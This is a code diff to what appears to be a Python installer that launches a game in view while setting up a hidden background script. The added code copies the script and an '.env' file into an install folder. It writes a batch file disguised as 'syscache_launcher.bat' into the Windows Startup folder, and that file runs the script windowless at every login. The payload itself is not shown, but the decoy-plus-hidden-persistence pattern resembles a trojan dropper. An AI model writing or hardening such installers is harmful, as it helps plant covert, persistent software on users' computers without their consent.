@@ -51,61 +51,69 @@ def copy_file_to_install(filename: str) -> str:
     return dst
 
 
-def get_pythonw_path() -> str:
-    pythonw = shutil.which("pythonw")
-    if pythonw:
-        return pythonw
-
-    exe = sys.executable
-    if exe.lower().endswith("python.exe"):
-        candidate = exe[:-10] + "pythonw.exe"
-        if os.path.exists(candidate):
-            return candidate
-
-    raise FileNotFoundError("pythonw.exe não encontrado no sistema.")
+def copy_optional_file_to_install(filename: str) -> str | None:
+    try:
+        return copy_file_to_install(filename)
+    except FileNotFoundError:
+        return None
 
 
-def get_python_path() -> str:
-    python = shutil.which("python")
-    if python:
-        return python
+def get_windows_python_command() -> list[str]:
+    if shutil.which("python"):
+        return ["python"]
+    if shutil.which("py"):
+        return ["py", "-3"]
+    return [sys.executable]
 
-    exe = sys.executable
-    if exe.lower().endswith("pythonw.exe"):
-        candidate = exe[:-11] + "python.exe"
-        if os.path.exists(candidate):
-            return candidate
 
-    return exe
+def build_startup_bat(main_script_path: str) -> str:
+    escaped_path = main_script_path.replace('"', '""')
+    return f'''@echo off
+set "SCRIPT_PATH={escaped_path}"
+where pyw >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b pyw "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+where pythonw >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b pythonw "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+where py >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b py -3 "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+start "" /b python "%SCRIPT_PATH%"
+exit /b 0
+'''
 
 
 def install_windows() -> None:
     main_script_path = copy_file_to_install("main_script.py")
     game_path = copy_file_to_install("game.py")
-    copy_file_to_install(".env")
-
-    pythonw = get_pythonw_path()
-    python = get_python_path()
+    copy_optional_file_to_install(".env")
+    python_cmd = get_windows_python_command()
 
     os.makedirs(STARTUP_DIR, exist_ok=True)
     bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
 
-    bat_content = f'''@echo off
-start "" "{pythonw}" "{main_script_path}"
-exit
-'''
-
     with open(bat_path, "w", encoding="utf-8") as f:
-        f.write(bat_content)
+        f.write(build_startup_bat(main_script_path))
 
-    subprocess.Popen([pythonw, main_script_path], shell=False)
-    subprocess.Popen([python, game_path], shell=False)
+    creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    subprocess.Popen(["cmd", "/c", bat_path], shell=False, creationflags=creationflags)
+    subprocess.Popen([*python_cmd, game_path], shell=False)
 
 
 def install_mac() -> None:
     main_script_path = copy_file_to_install("main_script_mac.py")
     game_path = copy_file_to_install("game.py")
-    copy_file_to_install(".env")
+    copy_optional_file_to_install(".env")
 
     python_bg = shutil.which("python3") or sys.executable
     python_fg = shutil.which("python3") or sys.executable
